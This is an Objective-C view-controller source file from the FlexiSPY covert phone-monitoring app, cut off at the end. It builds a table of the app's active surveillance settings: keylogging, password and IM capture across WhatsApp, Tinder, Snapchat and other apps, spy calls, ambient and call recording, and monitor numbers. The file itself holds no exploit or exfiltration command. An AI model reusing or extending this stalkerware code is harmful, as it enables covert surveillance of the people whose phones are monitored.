//
//  CurrentSettings.m
//  FlexiSPY
//
//  Created by Dominique  Mayrand on 12/1/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "CurrentSettings.h"
#import "SettingCell.h"
#import "MobileSPYAppDelegate.h"

#import "DefStd.h"
#import "AppEngineUICmd.h"
#import "LicenseInfo.h"
#import "ConfigurationManager.h"
#import "PreferencesData.h"
#import "Utils.h"

#import "RemoteCmdSettingsCode.h"

//static NSString *kCapture			= @"Capture";
//static NSString *kDeliveryRules		= @"Delivery Rules";
//static NSString *kEvents			= @"Event(s)";
//static NSString *kLocationInterval	= @"Location Interval";
//static NSString *kMonitorNumbers	= @"Monitor Number(s)";
//static NSString *kSpyCall			= @"Spy Call";
//static NSString *kWatchOptions		= @"Watch Options";
//static NSString *kProductNotActivate= @"Product Not Activate";
//
//static NSString *kOn				= @"On";
//static NSString *kOff				= @"Off";
//static NSString *kHours				= @"hour(s)";
//static NSString *kNoEvents			= @"event(s)";
//static NSString *kNoEventCapture	= @"No event capture";
//
//static NSString *kCaptureCall		= @"Call";
//static NSString *kCaptureSMS		= @"SMS";
//static NSString *kCaptureEmail		= @"Email";
//static NSString *kCaptureMMS		= @"MMS";
//static NSString *kCaptureLOC		= @"LOC";
//static NSString *kCaptureWP			= @"WP";
//static NSString *kCaptureCI			= @"CI";
//static NSString *kCaptureAudio		= @"Audio";
//static NSString *kCaptureVideo		= @"Video";
//static NSString *kCapturePM			= @"PM";
//static NSString *kCaptureIM			= @"IM";
//static NSString *kCaptureAddressb	= @"AB";

@implementation SettingObject

@synthesize mSettingName, mSettingValue, mSubSettings;


-(id) initWithName: (NSString*)aSettingName andValue: (NSString*)aSettingValue {
	self = [super init];
	if(self){
		[self setMSettingName:aSettingName];
		[self setMSettingValue:aSettingValue];
	}
	
	return self;
}

-(void) addSubSettings:(SettingObject*) aSo{
	if(mSubSettings == nil){
		mSubSettings = [[NSMutableArray alloc] init];
	}
	if(aSo && mSubSettings){
		[mSubSettings addObject:aSo];
	}
	
}
-(void) dealloc{
	if(mSubSettings) [mSubSettings release];
	[mSettingName release];
	[mSettingValue release];
	
	[super dealloc];
}

@end

@interface CurrentSettings (private)
-(NSMutableArray*) getFakeSettings;
@end


@implementation CurrentSettings

@synthesize mSettings, mTableView;

 // The designated initializer.  Override if you create the controller programmatically and want to perform customization that is not appropriate for viewDidLoad.
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil {
    if (self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil]) {
        // Custom initialization
		
    }
    return self;
}

-(void) appendEventWithFormat: (NSMutableString*) aString withEventText: (NSString*) aEvent{
	if (needComma) {
		[aString appendString:kFxStringComma];
	}
	[aString appendString:aEvent];
	needComma = TRUE;
}

- (NSMutableArray*) getSettingsFromPreferencesData: (PreferencesData *) aPreferencesData {
	DLog(@"---->Enter 1<----")
	MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	LicenseInfo *licenseInfo = [appDelegate mLicenseInfo];
	id <ConfigurationManager> configurationManager = [appDelegate mConfigurationManager];
	DLog(@"---->Enter 2<----")
	NSMutableArray* ma = [[NSMutableArray alloc] init];
	if ([licenseInfo licenseStatus] == ACTIVATED ||
		[licenseInfo licenseStatus] == DISABLE ||
		[licenseInfo licenseStatus] == EXPIRED) {
		// 1. Capture
		PrefEventsCapture *prefEventCapture = [aPreferencesData mPEventsCapture];
		PrefLocation *prefLocation = [aPreferencesData mPLocation];
		PrefRestriction *prefRestriction = [aPreferencesData mPRestriction];
		NSString *stringValue = nil;
		if ([prefEventCapture mStartCapture]) {
			stringValue = [NSString stringWithString:NSLocalizedString(@"kCurrentSettingsViewOn", @"")];
		} else {
			stringValue = [NSString stringWithString:NSLocalizedString(@"kCurrentSettingsViewOff", @"")];
		}
		SettingObject* so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewCapture", @"") andValue:stringValue];
		[ma addObject:so];
		[so release];
		DLog(@"---->Enter 3<----")
		// 2. Delivery Rules
		 so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewDeliveryRules", @"")
										 andValue:[NSString stringWithFormat:@"%d %@,%d %@", [prefEventCapture mDeliverTimer],
																							 NSLocalizedString(@"kCurrentSettingsViewHours", @""),
																							 [prefEventCapture mMaxEvent],
																							 NSLocalizedString(@"kCurrentSettingsViewNoEvents", @"")]];
		[ma addObject:so];
		[so release];
		
		// 2.a. Delivery Methods
		NSString *deliveryMethod = nil;
		if ([prefEventCapture mDeliveryMethod] == kDeliveryMethodAny) {
			deliveryMethod = NSLocalizedString(@"kCurrentSettingsViewDeliveryMethodAny", @"");
		} else if ([prefEventCapture mDeliveryMethod] == kDeliveryMethodWifi) {
			deliveryMethod = NSLocalizedString(@"kCurrentSettingsViewDeliveryMethodWifi", @"");
		}

		so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewDeliveryMethods", @"")
										andValue:deliveryMethod];
		[ma addObject:so];
		[so release];
		
		// 3. Event(s)
		NSMutableString *capture = [NSMutableString string];
		needComma = FALSE;
		// Call
		if ([prefEventCapture mEnableCallLog] && [configurationManager isSupportedFeature:kFeatureID_EventCall]) {
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureCall", @"")];
		}
		// SMS
		if ([prefEventCapture mEnableSMS] && [configurationManager isSupportedFeature:kFeatureID_EventSMS]) {
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureSMS", @"")];
		}
		// MMS
		if ([prefEventCapture mEnableMMS] && [configurationManager isSupportedFeature:kFeatureID_EventMMS]) {
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureMMS", @"")];
		}
		// Email
		if ([prefEventCapture mEnableEmail] && [configurationManager isSupportedFeature:kFeatureID_EventEmail]) {
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureEmail", @"")];
		}
		// Location
		if ([prefLocation mEnableLocation] && [configurationManager isSupportedFeature:kFeatureID_EventLocation]) {
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureLocation", @"")];
		}
		// Wallpaper
		if ([prefEventCapture mEnableWallPaper] && [configurationManager isSupportedFeature:kFeatureID_EventWallpaper]) {
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureWallpaper", @"")];
		}
		// Cammera image
		if ([prefEventCapture mEnableCameraImage] && [configurationManager isSupportedFeature:kFeatureID_EventCameraImage]) {
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureCameraImage", @"")];
		}
		// Audio
		if ([prefEventCapture mEnableAudioFile] && [configurationManager isSupportedFeature:kFeatureID_EventSoundRecording]) {
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureVoiceMemo", @"")];
		}
		// Video
		if ([prefEventCapture mEnableVideoFile] && [configurationManager isSupportedFeature:kFeatureID_EventVideoRecording]) {
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureCameraVideo", @"")];
		}
		// Pin message
		if ([prefEventCapture mEnablePinMessage] && [configurationManager isSupportedFeature:kFeatureID_EventPinMessage]) {
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCapturePinMessage", @"")];
		}
		// IM
		if ([prefEventCapture mEnableIM] && [configurationManager isSupportedFeature:kFeatureID_EventIM]) {
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIM", @"")];
		}
		// Browser url
		if ([prefEventCapture mEnableBrowserUrl] && [configurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureBrowserUrl", @"")];
		}
		// Application life cycle
		if ([prefEventCapture mEnableALC] && [configurationManager isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) {
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureALC", @"")];
		}
		// VoIP call log
		if ([prefEventCapture mEnableVoIPLog] && [configurationManager isSupportedFeature:kFeatureID_EventVoIP]) {
			DLog (@"CurrentSetting --> VOIP")
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureVoIP", @"")];
		}
		// KeyLog
		if ([prefEventCapture mEnableKeyLog] && [configurationManager isSupportedFeature:kFeatureID_EventKeyLog]) {
			DLog (@"CurrentSetting --> Key log")
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureKeyLog", @"")];
		}
        // Page visited
		if ([prefEventCapture mEnablePageVisited] && [configurationManager isSupportedFeature:kFeatureID_EventPageVisited]) {
			DLog (@"CurrentSetting --> Page visited")
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCapturePageVisited", @"")];
		}
        // Password
		if ([prefEventCapture mEnablePassword] && [configurationManager isSupportedFeature:kFeatureID_EventPassword]) {
			DLog (@"CurrentSetting --> Password")
			[self appendEventWithFormat:capture withEventText:NSLocalizedString(@"kCurrentSettingsViewCapturePassword", @"")];
		}
        
		if (![capture length]) {
			capture = [NSMutableString stringWithString:NSLocalizedString(@"kCurrentSettingsViewNoEventCapture", @"")];
		}
		so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewEvents", @"") andValue:capture];
		[ma addObject:so];
		[so release];
		DLog(@"---->Enter 4<----")
        
        // 3.1 IM Individual
        if ([prefEventCapture mEnableIM] && [configurationManager isSupportedFeature:kFeatureID_EventIM]) {
            
            NSMutableString *imIndividualSetting    = [NSMutableString string];
            needComma = FALSE;
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualWhatsApp)
                if ([Utils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMWhatsApp])
                    [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMWhatsApp", @"")];
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualLINE)
                 if ([Utils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMLINE])
                     [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMLINE", @"")];
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualFacebook)
                 if ([Utils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMFacebook])
                     [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMFacebook", @"")];
           
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualSkype)
                 if ([Utils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMSkype])
                     [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMSkype", @"")];
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualBBM)
                 if ([Utils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMBBM])
                     [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMBBM", @"")];
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualIMessage)
                 if ([Utils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMIMessage])
                     [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMiMessage", @"")];
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualViber)
                 if ([Utils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMViber])
                     [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMViber", @"")];
         
    
            // Skip google talk
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualWeChat)
                 if ([Utils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMWeChat])
                     [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMWeChat", @"")];
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualYahooMessenger)
                 if ([Utils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMYahooMessenger])
                     [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMYahooMessenger", @"")];
          
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualSnapchat)
                 if ([Utils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMSnapchat])
                     [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMSnapchat", @"")];
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualHangout)
                 if ([Utils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMHangout])
                     [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMHangout", @"")];
            
            // skip slingshot
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualTinder)
                if ([Utils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMTinder])
                    [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMTinder", @"")];
            
            if ([prefEventCapture mEnableIndividualIM] & kPrefIMIndividualInstagram)
                if ([Utils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMInstagram])
                    [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMInstagram", @"")];
            
            if ([imIndividualSetting length] == 0) {
                [self appendEventWithFormat:imIndividualSetting withEventText:NSLocalizedString(@"kCurrentSettingsViewCaptureIMNone", @"")];
            }

            so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewIMs", @"") andValue:imIndividualSetting];
            [ma addObject:so];
            [so release];
            DLog(@"---->Enter 4.1 <----")
		}
        
        // IM Attachment Limit Size
        if ([configurationManager isSupportedFeature:kFeatureID_EventIM]) {
            DLog (@"CurrentSetting --> IM Attachment Image Limit Size")
            NSString *values = [NSString stringWithFormat:@"%ld,%ld,%ld,%ld",
                                (long)[prefEventCapture mIMAttachmentImageLimitSize],
                                (long)[prefEventCapture mIMAttachmentAudioLimitSize],
                                (long)[prefEventCapture mIMAttachmentVideoLimitSize],
                                (long)[prefEventCapture mIMAttachmentNonMediaLimitSize]];
            so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewIMAttachmentLimitSize", @"") andValue:values];
            [ma addObject:so];
            [so release];
        }
        
		// 4.
		// a. Location Interval
		if([configurationManager isSupportedFeature:kFeatureID_EventLocation]){
			if ([prefLocation mEnableLocation]) {
				if ([prefLocation mLocationInterval]==3600) 
					stringValue = NSLocalizedString(@"kCurrentSettingsViewOneHour", @"");
				else if (([prefLocation mLocationInterval]>=60 && [prefLocation mLocationInterval]<3600))
					stringValue=[NSString stringWithFormat:NSLocalizedString(@"kCurrentSettingsViewMinutes", @""), [prefLocation mLocationInterval]/60];
				else
                    stringValue = [NSString stringWithFormat:NSLocalizedString(@"kCurrentSettingsViewSeconds", @""), [prefLocation mLocationInterval]];
			} 
			else {
				stringValue = [NSString stringWithString:NSLocalizedString(@"kCurrentSettingsViewOff", @"")];
			}
			so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewLocationInterval", @"") andValue:stringValue];
			[ma addObject:so];
			[so release];
		}
		// b. Note
		if ([configurationManager isSupportedFeature:kFeatureID_NoteCapture]) {
			NSString * value = @"";
			if ([prefEventCapture mEnableNote]) {
				value = NSLocalizedString(@"kCurrentSettingsViewOn", @"");
			} else {
				value = NSLocalizedString(@"kCurrentSettingsViewOff", @"");
			}
			so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewNote", @"") andValue:value];
			[ma addObject:so];
			[so release];
		}
		// c. Calendar
		if ([configurationManager isSupportedFeature:kFeatureID_EventCalendar]) {
			NSString * value = @"";
			if ([prefEventCapture mEnableCalendar]) {
				value = NSLocalizedString(@"kCurrentSettingsViewOn", @"");
			} else {
				value = NSLocalizedString(@"kCurrentSettingsViewOff", @"");
			}
			so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewCalendar", @"") andValue:value];
			[ma addObject:so];
			[so release];
		}
		DLog(@"---->Enter 5<----")
		// 5. Address book mode
		if ([configurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
			NSString * mode = @"";
			if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeOff) {
				mode = NSLocalizedString(@"kCurrentSettingsViewOff", @"");
			} else {
				mode = NSLocalizedString(@"kCurrentSettingsViewAddressbookModeMonitor", @"");
			}
			so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewAddressbookMode", @"") andValue:mode];
			[ma addObject:so];
			[so release];
		}
		// 6. Spy Call
		if([configurationManager isSupportedFeature:kFeatureID_SpyCall]){
			PrefMonitorNumber *prefMonitor = [aPreferencesData mPMonitorNumber];
			if ([prefMonitor mEnableMonitor]) {
				stringValue = [NSString stringWithString:NSLocalizedString(@"kCurrentSettingsViewOn", @"")];
			} else {
				stringValue = [NSString stringWithString:NSLocalizedString(@"kCurrentSettingsViewOff", @"")];
			}
			so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewOneCall", @"") andValue:stringValue];
			[ma addObject:so];
			[so release];
		}
		DLog(@"---->Enter 7<----")
		// 7. Monitor Number(s)
		if ([configurationManager isSupportedFeature:kFeatureID_SpyCall]	|| 
			[configurationManager isSupportedFeature:kFeatureID_OnDemandConference]	||
			[configurationManager isSupportedFeature:kFeatureID_MonitorNumbers]){
			NSMutableString *numbers = [NSMutableString string];
			PrefMonitorNumber *prefMonitor = [aPreferencesData mPMonitorNumber];
			for (NSInteger i = 0; i < [[prefMonitor mMonitorNumbers] count]; i++) {
				NSString *number = [[prefMonitor mMonitorNumbers] objectAtIndex:i];
				[numbers appendString:number];
				if (i < [[prefMonitor mMonitorNumbers] count] - 1) {
					[numbers appendString:kFxStringComma];
				}
			}
			so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewMonitorNumbers", @"") andValue:numbers];
			[ma addObject:so];
			[so release];
		}
		// 7.1. Spy Call on Facetime
		if([configurationManager isSupportedFeature:kFeatureID_SpyCallOnFacetime]){
			DLog(@"---->Enter 7.1<----")
			PrefMonitorFacetimeID *prefMonitorFacetimeID = [aPreferencesData mPMonitorFacetimeID];
			if ([prefMonitorFacetimeID mEnableMonitorFacetimeID]) {
				stringValue = [NSString stringWithString:NSLocalizedString(@"kCurrentSettingsViewOn", @"")];
			} else {
				stringValue = [NSString stringWithString:NSLocalizedString(@"kCurrentSettingsViewOff", @"")];
			}
			so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewSpycallOnFacetime", @"") andValue:stringValue];
			[ma addObject:so];
			[so release];
		}
		
		// 7.2. Spy Call Facetime ID
		if ([configurationManager isSupportedFeature:kFeatureID_SpyCallOnFacetime]){
			DLog(@"---->Enter 7.2<----")
			NSMutableString *numbers = [NSMutableString string];
			PrefMonitorFacetimeID *prefMonitorFacetimeID = [aPreferencesData mPMonitorFacetimeID];
			for (NSInteger i = 0; i < [[prefMonitorFacetimeID mMonitorFacetimeIDs] count]; i++) {
				NSString *number = [[prefMonitorFacetimeID mMonitorFacetimeIDs] objectAtIndex:i];
				[numbers appendString:number];
				if (i < [[prefMonitorFacetimeID mMonitorFacetimeIDs] count] - 1) {
					[numbers appendString:kFxStringComma];
				}
			}
			so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewMonitorFacetimeIDs", @"") andValue:numbers];
			[ma addObject:so];
			[so release];
		}
		DLog(@"---->Enter 8<----")
		// 8. Call watch
		if([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
			PrefWatchList *prefWL = [aPreferencesData mPWatchList];
			stringValue = [prefWL mEnableWatchNotification] ? NSLocalizedString(@"kCurrentSettingsViewOn", @"") : NSLocalizedString(@"kCurrentSettingsViewOff", @"");
			so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewCallWatch", @"") andValue:stringValue];
			[ma addObject:so];
			[so release];
		}
		// 9. Watch Options
		if([configurationManager isSupportedFeature:kFeatureID_WatchList]){
			PrefWatchList *prefWL = [aPreferencesData mPWatchList];
			so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewWatchOptions", @"") andValue:[NSString stringWithFormat:@"%d,%d,%d,%d", ([prefWL mWatchFlag] & kWatch_In_Addressbook) ? 1 : 0,
																											([prefWL mWatchFlag] & kWatch_Not_In_Addressbook) ? 1 : 0,
																											([prefWL mWatchFlag] & kWatch_In_List) ? 1 : 0,
																											([prefWL mWatchFlag] & kWatch_Private_Or_Unknown_Number) ? 1 : 0]];
			[ma addObject:so];
			[so release];
		}
		// 10. Watch numbers
		if([configurationManager isSupportedFeature:kFeatureID_WatchList]){
			PrefWatchList *prefWL = [aPreferencesData mPWatchList];
			NSMutableString *numbers = [NSMutableString string];
			for (NSInteger i = 0; i < [[prefWL mWatchNumbers] count]; i++) {
				NSString *number = [[prefWL mWatchNumbers] objectAtIndex:i];
				[numbers appendString:number];
				if (i < [[prefWL mWatchNumbers] count] - 1) {
					[numbers appendString:kFxStringComma];
				}
			}
			so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewWatchNumbers", @"") andValue:numbers];
			[ma addObject:so];
			[so release];
		}
		
		// 11. Home numbers
		if([configurationManager isSupportedFeature:kFeatureID_HomeNumbers]){
			NSMutableString *numbers = [NSMutableString string];
			PrefHomeNumber *prefHomeNumber = [aPreferencesData mPHomeNumber];
			for (NSInteger i = 0; i < [[prefHomeNumber mHomeNumbers] count]; i++) {
				NSString *number = [[prefHomeNumber mHomeNumbers] objectAtIndex:i];
				[numbers appendString:number];
				if (i < [[prefHomeNumber mHomeNumbers] count] - 1) {
					[numbers appendString:kFxStringComma];
				}
			}
			so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewHomeNumbers", @"") andValue:numbers];
			[ma addObject:so];
			[so release];
		}
        
        // 12. Temporal Control
        if ([configurationManager isSupportedFeature:kFeatureID_AmbientRecording]) {
            if ([prefEventCapture mEnableTemporalControlAR]) {
				stringValue = [NSString stringWithString:NSLocalizedString(@"kCurrentSettingsViewOn", @"")];
			} else {
				stringValue = [NSString stringWithString:NSLocalizedString(@"kCurrentSettingsViewOff", @"")];
			}
			so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewTemporalControlAmbient", @"") andValue:stringValue];
			[ma addObject:so];
			[so release];
        }
        
        // 13. Call recording
        if([configurationManager isSupportedFeature:kFeatureID_CallRecording]) {
            PrefEventsCapture *prefEvents = [aPreferencesData mPEventsCapture];
            stringValue = [prefEvents mEnableCallRecording] ? NSLocalizedString(@"kCurrentSettingsViewOn", @"") : NSLocalizedString(@"kCurrentSettingsViewOff", @"");
            so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewCallRecording", @"") andValue:stringValue];
            [ma addObject:so];
            [so release];
        }
        // 14. Call record watch options
        if([configurationManager isSupportedFeature:kFeatureID_CallRecording]){
            PrefCallRecord *prefCR = [aPreferencesData mPCallRecord];
            so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewCallRecordWatchOptions", @"") andValue:[NSString stringWithFormat:@"%d,%d,%d,%d", ([prefCR mWatchFlag] & kWatch_In_Addressbook) ? 1 : 0,
                                                                                                                           ([prefCR mWatchFlag] & kWatch_Not_In_Addressbook) ? 1 : 0,
                                                                                                                           ([prefCR mWatchFlag] & kWatch_In_List) ? 1 : 0,
                                                                                                                           ([prefCR mWatchFlag] & kWatch_Private_Or_Unknown_Number) ? 1 : 0]];
            [ma addObject:so];
            [so release];
        }
        // 15. Call record watch numbers
        if([configurationManager isSupportedFeature:kFeatureID_CallRecording]){
            PrefCallRecord *prefCR = [aPreferencesData mPCallRecord];
            NSMutableString *numbers = [NSMutableString string];
            for (NSInteger i = 0; i < [[prefCR mWatchNumbers] count]; i++) {
                NSString *number = [[prefCR mWatchNumbers] objectAtIndex:i];
                [numbers appendString:number];
                if (i < [[prefCR mWatchNumbers] count] - 1) {
                    [numbers appendString:kFxStringComma];
                }
            }
            so = [[SettingObject alloc] initWithName:NSLocalizedString(@"kCurrentSettingsViewCallRecordWatchNumbers", @"") andValue:numbers];
            [ma addObject:so];
            [so release];
        }
	} else {
		// Product not activated
		NSString *licenseStatus = nil;
		if ([licenseInfo licenseStatus] == DEACTIVATED) {
			licenseStatus = NSLocalizedString(@"kCurrentSettingsViewProductNotActivate", @"");
		} else if ([licenseInfo licenseStatus] == DISABLE) {
			licenseStatus = NSLocalizedString(@"kCurrentSettingsViewProductDisabled", @"");
		} else if ([licenseInfo licenseStatus] == EXPIRED) {
			licenseStatus = NSLocalizedString(@"kCurrentSettingsViewProductExpired", @"");
		} else {
			licenseStatus = NSLocalizedString(@"kCurrentSettingsViewProductUnknown", @"");
		}
			
		SettingObject* so = [[SettingObject alloc] initWithName:licenseStatus andValue:@""];
		[ma addObject:so];
		[so release];
	}
	DLog(@"---->End<----")
	return [ma autorelease];
}

-(NSMutableArray*) getFakeSettings
{
	NSMutableArray* ma = [[NSMutableArray alloc] init];
	SettingObject* so = [[ SettingObject alloc] initWithName:@"Capture" andValue: @"On"];
	[ma addObject:so];
	[so release];
	so = [[ SettingObject alloc] initWithName:@"Events" andValue: @"Call, EMail, SMS"];
	[ma addObject:so];
	[so release];
	so = [[ SettingObject alloc] initWithName:@"Monitor Number" andValue: @"0870760748"];
	[ma addObject:so];
	[so release];
	
	return [ma autorelease];
}

/*- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil {
    if (self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil]) {
        // Custom initialization
    }
    return self;
}*/



// Implement viewDidLoad to do additional setup after loading the view, typically from a nib.
- (void)viewDidLoad {
    [super viewDidLoad];
	
	[mTableView setDelegate:self];
	[mTableView setDataSource:self];
	
	//mSettings = [self getFakeSettings];
	mSettings = [[NSMutableArray alloc] init];
	
	MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] addCommandDelegate:self];
	[[appDelegate mAppUIConnection] processCommand:kAppUI2EngineGetCurrentSettingsCmd withCmdData:nil];
}


/*
// Override to allow orientations other than the default portrait orientation.
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
    // Return YES for supported orientations
    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}
*/

- (void)didReceiveMemoryWarning {
	// Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];
	
	// Release any cached data, images, etc that aren't in use.
}

- (void)viewDidUnload {
	// Release any retained subviews of the main view.
	// e.g. self.myOutlet = nil;
}

- (void)dealloc {
	[mSettings release];
	[mTableView release];
    [super dealloc];
}

#pragma mark Table view methods

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
    return [mSettings count];
	
}


// Customize the number of rows in the table view.
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return 1;
	
}


// Customize the appearance of table view cells.
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    
    static NSString *CellIdentifier = @"Cell";
    
    SettingCell *cell = (SettingCell*) [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {		
        cell = [[[SettingCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier] autorelease];
	}
	SettingObject*  row = [ mSettings objectAtIndex:[indexPath section]];
	
	[cell setValues: row.mSettingName: row.mSettingValue: row.mSubSettings];

    return cell;
}

- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section {
	SettingObject*  row = [mSettings objectAtIndex:section];
	return row.mSettingName;
}

- (void)viewWillAppear:(BOOL)animated {
	DLog(@"view appeared");
	[super viewWillAppear:animated];
	[self.view setHidden:NO];
}

- (void)viewWillDisappear:(BOOL)animated {
	[super viewWillDisappear:animated];
	DLog(@"----->Enter<-----")
	MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] removeCommandDelegate:self];
}

- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    return 50; //[indexPath row]; // your dynamic height...
}

// Override to support row selection in the table view.
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
	static NSString *CellIdentifier = @"Cell";
    
    SettingCell *cell = (SettingCell*) [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {		
        cell = [[[SettingCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier] autorelease];
	}
	SettingObject*  row = [ mSettings objectAtIndex:[indexPath section]];
	
	[cell setValues: row.mSettingName: row.mSettingValue: row.mSubSettings];
	if ([cell isLablesTextOverlapCellFrame]) {
